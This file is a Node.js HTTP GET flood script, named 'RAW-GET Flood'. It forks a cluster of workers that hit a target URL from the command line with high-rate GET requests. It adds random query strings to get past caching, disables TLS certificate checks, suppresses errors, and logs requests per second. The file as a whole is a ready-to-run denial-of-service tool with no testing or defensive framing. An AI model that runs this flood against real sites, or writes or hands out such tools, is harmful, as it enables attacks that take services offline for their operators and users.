#!/usr/bin/env node

// RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)

const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 30,
    rate: parseInt(process.argv[5]) || 1000
};

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const keepAliveAgent = new httpLib.Agent({
    keepAlive: true,
    keepAliveMsecs: 10000,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    timeout: 60000
});

if (cluster.isMaster) {
    console.log(`\n🔥 RAW-GET (no proxy) | Target: ${args.target} | Time: ${args.time}s | Rate: ${args.rate}/s/worker | Workers: ${args.threads}`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    let running = true;
    let requestCount = 0;

    function sendRequest() {
        if (!running) return;
        const options = {
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Connection': 'keep-alive'
            },
            agent: keepAliveAgent,
            rejectUnauthorized: false
        };
        const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
        req.on('error', () => {});
        req.end();
    }

    const intervalMs = 1000 / args.rate;
    const intervalId = setInterval(() => sendRequest(), intervalMs);
    setInterval(() => {
        console.log(`RPS: ${requestCount}`);
        requestCount = 0;
    }, 1000);
    setTimeout(() => {
        running = false;
        clearInterval(intervalId);
        process.exit(0);
    }, args.time * 1000);
}
